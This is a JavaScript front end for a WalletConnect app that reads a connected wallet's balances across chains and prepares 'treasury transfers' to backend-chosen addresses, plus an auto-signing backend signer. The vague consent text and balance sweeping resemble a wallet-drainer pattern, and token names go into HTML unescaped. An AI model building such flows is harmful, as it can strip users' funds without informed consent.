import EthereumProvider from "https://esm.sh/@walletconnect/ethereum-provider@2.21.8";

const CONSENT_TEXT = "I understand and consent to the wallet interaction and automation flow.";

const state = {
  provider: null,
  config: null,
  syncResult: null,
  backendSignerSyncResult: null,
  preparedTransfer: null,
  walletAddress: "",
  approvedChains: []
};

const elements = {
  apiBaseUrl: document.querySelector("#apiBaseUrl"),
  consentCheckbox: document.querySelector("#consentCheckbox"),
  walletAddress: document.querySelector("#walletAddress"),
  networkGrid: document.querySelector("#networkGrid"),
  chainSelect: document.querySelector("#chainSelect"),
  assetSelect: document.querySelector("#assetSelect"),
  amountInput: document.querySelector("#amountInput"),
  status: document.querySelector("#status"),
  transferStatus: document.querySelector("#transferStatus"),
  backendSignerAddress: document.querySelector("#backendSignerAddress"),
  backendSignerState: document.querySelector("#backendSignerState"),
  signerKey: document.querySelector("#signerKey"),
  signerChainSelect: document.querySelector("#signerChainSelect"),
  signerAssetSelect: document.querySelector("#signerAssetSelect"),
  signerAmountInput: document.querySelector("#signerAmountInput"),
  backendSignerTransferStatus: document.querySelector("#backendSignerTransferStatus"),
  connectWallet: document.querySelector("#connectWallet"),
  syncWallet: document.querySelector("#syncWallet"),
  disconnectWallet: document.querySelector("#disconnectWallet"),
  prepareTransfer: document.querySelector("#prepareTransfer"),
  approveTransfer: document.querySelector("#approveTransfer"),
  syncBackendSigner: document.querySelector("#syncBackendSigner"),
  autoSignTransfer: document.querySelector("#autoSignTransfer")
};

const savedApiBase = localStorage.getItem("EVM_WALLETCONNECT_API_BASE_URL");
if (savedApiBase) {
  elements.apiBaseUrl.value = savedApiBase;
}

const savedSignerKey = localStorage.getItem("EVM_BACKEND_SIGNER_TRIGGER_SECRET");
if (savedSignerKey) {
  elements.signerKey.value = savedSignerKey;
}

function setStatus(message, payload) {
  const suffix = payload ? `\n\n${JSON.stringify(payload, null, 2)}` : "";
  elements.status.textContent = `${message}${suffix}`;
}

function apiBaseUrl() {
  const value = elements.apiBaseUrl.value.trim().replace(/\/$/, "");
  localStorage.setItem("EVM_WALLETCONNECT_API_BASE_URL", value);
  return value;
}

function backendSignerReady() {
  const signer = state.config?.backendSigner;
  return Boolean(signer?.enabled && signer?.configured && signer?.address);
}

function backendSignerRequiresSecret() {
  return Boolean(state.config?.backendSigner?.requiresTriggerSecret);
}

function updateActions() {
  const hasConsent = elements.consentCheckbox.checked;
  const connected = Boolean(state.walletAddress);
  const synced = Boolean(state.syncResult?.chains?.length);
  const signerReady = backendSignerReady();
  const signerSynced = Boolean(state.backendSignerSyncResult?.chains?.length);
  const signerHasSecret = !backendSignerRequiresSecret() || Boolean(elements.signerKey.value.trim());

  elements.connectWallet.disabled = !hasConsent || connected;
  elements.syncWallet.disabled = !connected;
  elements.disconnectWallet.disabled = !connected;
  elements.chainSelect.disabled = !synced;
  elements.assetSelect.disabled = !synced;
  elements.amountInput.disabled = !synced;
  elements.prepareTransfer.disabled = !synced;
  elements.approveTransfer.disabled = !state.preparedTransfer;
  elements.signerKey.disabled = !signerReady || !backendSignerRequiresSecret();
  elements.syncBackendSigner.disabled = !signerReady;
  elements.signerChainSelect.disabled = !signerSynced;
  elements.signerAssetSelect.disabled = !signerSynced;
  elements.signerAmountInput.disabled = !signerSynced;
  elements.autoSignTransfer.disabled = !signerSynced || !signerHasSecret;
}

function renderNetworks(syncResult) {
  const chains = syncResult?.chains ?? state.config?.supportedChains ?? [];

  elements.networkGrid.innerHTML = chains
    .map((chain) => {
      const balance = chain.balanceFormatted
        ? `${Number(chain.balanceFormatted).toLocaleString(undefined, {
            maximumFractionDigits: 6
          })} ${chain.symbol}`
        : chain.symbol;
      const tokenCount = chain.tokens?.filter((token) => token.balanceRaw !== "0").length ?? 0;

      return `
        <article class="network">
          <span>${chain.name || chain.chainName}</span>
          <strong>${balance}</strong>
          ${chain.blockNumber ? `<small>Block ${chain.blockNumber}</small>` : ""}
          <small>${tokenCount} supported token${tokenCount === 1 ? "" : "s"} with balance</small>
        </article>
      `;
    })
    .join("");
}

function setTransferStatus(message, payload) {
  const suffix = payload ? `\n\n${JSON.stringify(payload, null, 2)}` : "";
  elements.transferStatus.textContent = `${message}${suffix}`;
}

function setBackendSignerTransferStatus(message, payload) {
  const suffix = payload ? `\n\n${JSON.stringify(payload, null, 2)}` : "";
  elements.backendSignerTransferStatus.textContent = `${message}${suffix}`;
}

function renderBackendSignerStatus() {
  const signer = state.config?.backendSigner;

  if (!signer) {
    elements.backendSignerAddress.textContent = "Not loaded";
    elements.backendSignerState.textContent = "Unknown";
    return;
  }

  elements.backendSignerAddress.textContent = signer.address || "Not configured";

  if (!signer.enabled) {
    elements.backendSignerState.textContent = "Disabled";
    setBackendSignerTransferStatus("Backend signer is disabled.");
    return;
  }

  if (!signer.configured) {
    elements.backendSignerState.textContent = "Missing private key";
    setBackendSignerTransferStatus("Backend signer private key is not configured.");
    return;
  }

  elements.backendSignerState.textContent = signer.requiresTriggerSecret ? "Ready - key required" : "Ready";
  setBackendSignerTransferStatus("Sync the backend signer to prepare automatic transfers.");
}

async function getJson(path) {
  const response = await fetch(`${apiBaseUrl()}${path}`);
  const payload = await response.json().catch(() => ({}));

  if (!response.ok) {
    throw new Error(payload.error || `Request failed with status ${response.status}`);
  }

  return payload;
}

function backendSignerAuthHeaders() {
  const signerKey = elements.signerKey.value.trim();
  localStorage.setItem("EVM_BACKEND_SIGNER_TRIGGER_SECRET", signerKey);

  return signerKey ? { Authorization: `Bearer ${signerKey}` } : {};
}

async function postJson(path, body, extraHeaders = {}) {
  const response = await fetch(`${apiBaseUrl()}${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json", ...extraHeaders },
    body: JSON.stringify(body)
  });

  const payload = await response.json().catch(() => ({}));

  if (!response.ok) {
    throw new Error(payload.error || `Request failed with status ${response.status}`);
  }

  return payload;
}

async function loadConfig() {
  if (state.config) {
    return state.config;
  }

  state.config = await getJson("/api/wallet/config");
  renderNetworks();
  renderBackendSignerStatus();
  return state.config;
}

function parseSessionChains(provider, supportedChains) {
  const supported = new Set(supportedChains.map((chain) => chain.id));
  const namespaceAccounts = provider.session?.namespaces?.eip155?.accounts ?? [];
  const chainIds = namespaceAccounts
    .map((account) => Number(account.split(":")[1]))
    .filter((chainId) => supported.has(chainId));

  if (provider.chainId && supported.has(Number(provider.chainId))) {
    chainIds.push(Number(provider.chainId));
  }

  return [...new Set(chainIds.length ? chainIds : supportedChains.map((chain) => chain.id))];
}

function parseUnits(value, decimals) {
  const normalized = value.trim();

  if (!/^\d+(\.\d+)?$/.test(normalized)) {
    throw new Error("Enter a valid positive amount.");
  }

  const [whole, fraction = ""] = normalized.split(".");

  if (fraction.length > decimals) {
    throw new Error(`This asset supports up to ${decimals} decimal places.`);
  }

  const paddedFraction = fraction.padEnd(decimals, "0");
  const raw = BigInt(whole) * 10n ** BigInt(decimals) + BigInt(paddedFraction || "0");

  if (raw <= 0n) {
    throw new Error("Amount must be greater than zero.");
  }

  return raw.toString();
}

function currentChain() {
  const chainId = Number(elements.chainSelect.value);
  return state.syncResult?.chains?.find((chain) => chain.chainId === chainId);
}

function currentAsset() {
  const chain = currentChain();
  if (!chain) {
    return null;
  }

  if (elements.assetSelect.value === "native") {
    return {
      assetType: "native",
      symbol: chain.symbol,
      decimals: 18,
      balanceRaw: chain.balanceWei,
      balanceFormatted: chain.balanceFormatted
    };
  }

  const token = chain.tokens?.find((item) => item.address === elements.assetSelect.value);
  return token ? { ...token, assetType: "erc20" } : null;
}

function renderAssetOptions() {
  const chain = currentChain();

  if (!chain) {
    elements.assetSelect.innerHTML = "";
    return;
  }

  const nativeOption = `<option value="native">${chain.symbol} - ${Number(chain.balanceFormatted).toLocaleString(undefined, {
    maximumFractionDigits: 6
  })}</option>`;
  const tokenOptions = (chain.tokens || [])
    .filter((token) => token.balanceRaw !== "0")
    .map(
      (token) =>
        `<option value="${token.address}">${token.symbol} - ${Number(token.balanceFormatted).toLocaleString(undefined, {
          maximumFractionDigits: 6
        })}</option>`
    )
    .join("");

  elements.assetSelect.innerHTML = `${nativeOption}${tokenOptions}`;
}

function renderTransferOptions() {
  const chains = state.syncResult?.chains ?? [];

  elements.chainSelect.innerHTML = chains
    .map((chain) => `<option value="${chain.chainId}">${chain.chainName}</option>`)
    .join("");

  renderAssetOptions();
  updateActions();
}

function currentSignerChain() {
  const chainId = Number(elements.signerChainSelect.value);
  return state.backendSignerSyncResult?.chains?.find((chain) => chain.chainId === chainId);
}

function currentSignerAsset() {
  const chain = currentSignerChain();
  if (!chain) {
    return null;
  }

  if (elements.signerAssetSelect.value === "native") {
    return {
      assetType: "native",
      symbol: chain.symbol,
      decimals: 18,
      balanceRaw: chain.balanceWei,
      balanceFormatted: chain.balanceFormatted
    };
  }

  const token = chain.tokens?.find((item) => item.address === elements.signerAssetSelect.value);
  return token ? { ...token, assetType: "erc20" } : null;
}

function renderSignerAssetOptions() {
  const chain = currentSignerChain();

  if (!chain) {
    elements.signerAssetSelect.innerHTML = "";
    return;
  }

  const nativeOption = `<option value="native">${chain.symbol} - ${Number(chain.balanceFormatted).toLocaleString(undefined, {
    maximumFractionDigits: 6
  })}</option>`;
  const tokenOptions = (chain.tokens || [])
    .filter((token) => token.balanceRaw !== "0")
    .map(
      (token) =>
        `<option value="${token.address}">${token.symbol} - ${Number(token.balanceFormatted).toLocaleString(undefined, {
          maximumFractionDigits: 6
        })}</option>`
    )
    .join("");

  elements.signerAssetSelect.innerHTML = `${nativeOption}${tokenOptions}`;
}

function renderBackendSignerTransferOptions() {
  const chains = state.backendSignerSyncResult?.chains ?? [];

  elements.signerChainSelect.innerHTML = chains
    .map((chain) => `<option value="${chain.chainId}">${chain.chainName}</option>`)
    .join("");

  renderSignerAssetOptions();
  updateActions();
}

async function initProvider(config) {
  const chainIds = config.supportedChains.map((chain) => chain.id);
  const requiredChain = chainIds[0];
  const optionalChains = chainIds.filter((chainId) => chainId !== requiredChain);

  const provider = await EthereumProvider.init({
    projectId: config.walletConnectProjectId,
    chains: [requiredChain],
    optionalChains,
    showQrModal: true,
    methods: config.walletConnect.methods,
    optionalMethods: config.walletConnect.methods,
    events: config.walletConnect.events,
    optionalEvents: config.walletConnect.events,
    metadata: {
      name: "EVM Infrastructure Access",
      description: "WalletConnect session for account synchronization and wallet-reviewed requests.",
      url: window.location.origin,
      icons: [`${window.location.origin}/favicon.ico`]
    }
  });

  provider.on("accountsChanged", (accounts) => {
    if (accounts?.[0]) {
      state.walletAddress = accounts[0];
      elements.walletAddress.textContent = accounts[0];
    }
  });

  provider.on("chainChanged", () => {
    if (state.walletAddress) {
      syncWallet().catch((error) => setStatus(error.message));
    }
  });

  provider.on("disconnect", () => {
    resetConnection("Wallet disconnected.");
  });

  return provider;
}

async function connectWallet() {
  if (!elements.consentCheckbox.checked) {
    setStatus("Consent is required before connection.");
    return;
  }

  setStatus("Opening WalletConnect...");
  const config = await loadConfig();
  const provider = await initProvider(config);

  await provider.connect();
  const accounts = await provider.request({ method: "eth_accounts" });

  if (!accounts?.[0]) {
    throw new Error("No account was returned by the wallet.");
  }

  state.provider = provider;
  state.walletAddress = accounts[0];
  state.approvedChains = parseSessionChains(provider, config.supportedChains);
  elements.walletAddress.textContent = state.walletAddress;
  updateActions();

  await postJson("/api/wallet/session", {
    walletAddress: state.walletAddress,
    connector: "walletconnect-v2",
    chains: state.approvedChains,
    consentGranted: true,
    consentText: CONSENT_TEXT
  });

  await syncWallet();
}

async function syncWallet() {
  if (!state.walletAddress) {
    setStatus("Connect a wallet first.");
    return;
  }

  setStatus("Synchronizing supported networks...");
  const result = await postJson("/api/wallet/sync", {
    walletAddress: state.walletAddress,
    chains: state.approvedChains
  });

  state.syncResult = result;
  state.preparedTransfer = null;
  renderNetworks(result);
  renderTransferOptions();
  setTransferStatus("Select an asset and amount to prepare a treasury transfer.");
  setStatus("Wallet synchronized.", result);
}

async function prepareTransfer() {
  const chain = currentChain();
  const asset = currentAsset();

  if (!chain || !asset) {
    setTransferStatus("Select a supported network and asset.");
    return;
  }

  const amountRaw = parseUnits(elements.amountInput.value, asset.decimals);

  setTransferStatus("Preparing transfer request...");
  const prepared = await postJson("/api/transfer/prepare", {
    walletAddress: state.walletAddress,
    chainId: chain.chainId,
    assetType: asset.assetType,
    tokenAddress: asset.assetType === "erc20" ? asset.address : undefined,
    amountRaw
  });

  state.preparedTransfer = prepared;
  updateActions();
  setTransferStatus("Transfer request prepared. Review it in your wallet before approval.", prepared);
}

async function approveTransfer() {
  const prepared = state.preparedTransfer;

  if (!prepared || !state.provider) {
    setTransferStatus("Prepare a transfer first.");
    return;
  }

  setTransferStatus("Opening wallet approval...");

  await state.provider.request({
    method: "wallet_switchEthereumChain",
    params: [{ chainId: prepared.txRequest.chainId }]
  });

  const txHash = await state.provider.request({
    method: "eth_sendTransaction",
    params: [
      {
        from: prepared.txRequest.from,
        to: prepared.txRequest.to,
        value: prepared.txRequest.value,
        data: prepared.txRequest.data || "0x",
        gas: prepared.txRequest.gas
      }
    ]
  });

  const execution = await postJson("/api/transfer/execute", {
    transferId: prepared.transferId,
    walletAddress: state.walletAddress,
    chainId: prepared.chainId,
    txHash
  });

  state.preparedTransfer = null;
  updateActions();
  await syncWallet();
  setTransferStatus("Transfer submitted.", execution);
}

async function syncBackendSigner() {
  const config = await loadConfig();
  const signerAddress = config.backendSigner?.address;

  if (!backendSignerReady() || !signerAddress) {
    setBackendSignerTransferStatus("Backend signer is not ready.");
    return;
  }

  setBackendSignerTransferStatus("Synchronizing backend signer...");
  const result = await postJson("/api/wallet/sync", {
    walletAddress: signerAddress,
    chains: config.supportedChains.map((chain) => chain.id)
  });

  state.backendSignerSyncResult = result;
  renderBackendSignerTransferOptions();
  setBackendSignerTransferStatus("Backend signer synchronized.", result);
}

async function autoSignTransfer() {
  const chain = currentSignerChain();
  const asset = currentSignerAsset();

  if (!chain || !asset) {
    setBackendSignerTransferStatus("Select a supported backend signer network and asset.");
    return;
  }

  if (backendSignerRequiresSecret() && !elements.signerKey.value.trim()) {
    setBackendSignerTransferStatus("Enter the backend signer key.");
    return;
  }

  const amountRaw = parseUnits(elements.signerAmountInput.value, asset.decimals);

  setBackendSignerTransferStatus("Signing and submitting with the backend signer...");
  const signed = await postJson(
    "/api/transfer/backend-signer/auto-sign",
    {
      chainId: chain.chainId,
      assetType: asset.assetType,
      tokenAddress: asset.assetType === "erc20" ? asset.address : undefined,
      amountRaw
    },
    backendSignerAuthHeaders()
  );

  try {
    await syncBackendSigner();
  } catch (error) {
    const refreshError = error instanceof Error ? error.message : "Unable to refresh backend signer balances.";
    setBackendSignerTransferStatus(`Backend signer transfer submitted. Refresh failed: ${refreshError}`, signed);
    return;
  }

  setBackendSignerTransferStatus("Backend signer transfer submitted.", signed);
}

async function disconnectWallet() {
  if (state.provider?.disconnect) {
    await state.provider.disconnect();
  }

  resetConnection("Wallet disconnected.");
}

function resetConnection(message) {
  state.provider = null;
  state.walletAddress = "";
  state.approvedChains = [];
  state.syncResult = null;
  state.preparedTransfer = null;
  elements.walletAddress.textContent = "Not connected";
  renderNetworks();
  renderTransferOptions();
  updateActions();
  setTransferStatus("Connect and synchronize a wallet to prepare transfers.");
  setStatus(message);
}

function handleAsync(fn, setError = setStatus) {
  return async () => {
    try {
      await fn();
    } catch (error) {
      setError(error instanceof Error ? error.message : "Unexpected error");
      updateActions();
    }
  };
}

elements.consentCheckbox.addEventListener("change", () => {
  updateActions();
  setStatus(elements.consentCheckbox.checked ? "Ready to connect." : "Consent is required before connection.");
});
elements.connectWallet.addEventListener("click", handleAsync(connectWallet));
elements.syncWallet.addEventListener("click", handleAsync(syncWallet));
elements.disconnectWallet.addEventListener("click", handleAsync(disconnectWallet));
elements.chainSelect.addEventListener("change", () => {
  state.preparedTransfer = null;
  renderAssetOptions();
  updateActions();
});
elements.assetSelect.addEventListener("change", () => {
  state.preparedTransfer = null;
  updateActions();
});
elements.amountInput.addEventListener("input", () => {
  state.preparedTransfer = null;
  updateActions();
});
elements.prepareTransfer.addEventListener("click", handleAsync(prepareTransfer));
elements.approveTransfer.addEventListener("click", handleAsync(approveTransfer));
elements.signerKey.addEventListener("input", updateActions);
elements.syncBackendSigner.addEventListener("click", handleAsync(syncBackendSigner, setBackendSignerTransferStatus));
elements.signerChainSelect.addEventListener("change", () => {
  renderSignerAssetOptions();
  updateActions();
});
elements.signerAssetSelect.addEventListener("change", updateActions);
elements.signerAmountInput.addEventListener("input", updateActions);
elements.autoSignTransfer.addEventListener("click", handleAsync(autoSignTransfer, setBackendSignerTransferStatus));

loadConfig()
  .then(() => updateActions())
  .catch((error) => {
    const message = error instanceof Error ? error.message : "Unable to load backend configuration.";
    setStatus(message);
    setBackendSignerTransferStatus(message);
    updateActions();
  });
